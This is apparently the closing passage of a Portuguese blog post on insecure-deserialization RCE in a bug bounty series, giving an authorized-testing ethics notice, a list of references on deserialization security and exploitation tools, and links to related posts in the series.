RCE é o tipo de falha em que um passo em falso vira incidente real. Tudo aqui é para **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. Para **provar** execução, use sempre métodos não-destrutivos (callback OAST, comandos inofensivos como `id`); **nunca** rode `rm`, exfiltre dados de produção ou persista acesso. Deserializar objetos forjados em sistemas de terceiros sem autorização é crime. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [OWASP Top 10 — A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger — Insecure deserialization](https://portswigger.net/web-security/deserialization)
- [ysoserial (frohoff)](https://github.com/frohoff/ysoserial) · [phpggc (Ambionics)](https://github.com/ambionics/phpggc) · [ysoserial.net (pwntester)](https://github.com/pwntester/ysoserial.net)
- [PHP — `unserialize()` (formato e `allowed_classes`)](https://www.php.net/manual/en/function.unserialize.php) · [Python — `pickle` (aviso de segurança)](https://docs.python.org/3/library/pickle.html)
- [PortSwigger — PHAR deserialization](https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization) · [Sonar — What is Phar Deserialization](https://www.sonarsource.com/blog/new-php-exploitation-technique/)
- [elttam — Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/) · [Microsoft — `BinaryFormatter` obsoleto/inseguro](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)
- [CVE-2017-5941 — node-serialize RCE](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)

---
*Relacionado na série: [RCE: Command Injection, SSTI e Upload](/posts/rce-command-injection-ssti/) · [SSRF](/posts/ssrf/) · [LFI / Path Traversal](/posts/lfi-path-traversal/) · [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) · [Broken Access Control (IDOR/BOLA/BFLA)](/posts/broken-access-control-idor-bola-bfla/) · base: [Recon & Discovery](/posts/recon-discovery/) · [Glossário](/posts/fundamentos-web-hacking/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
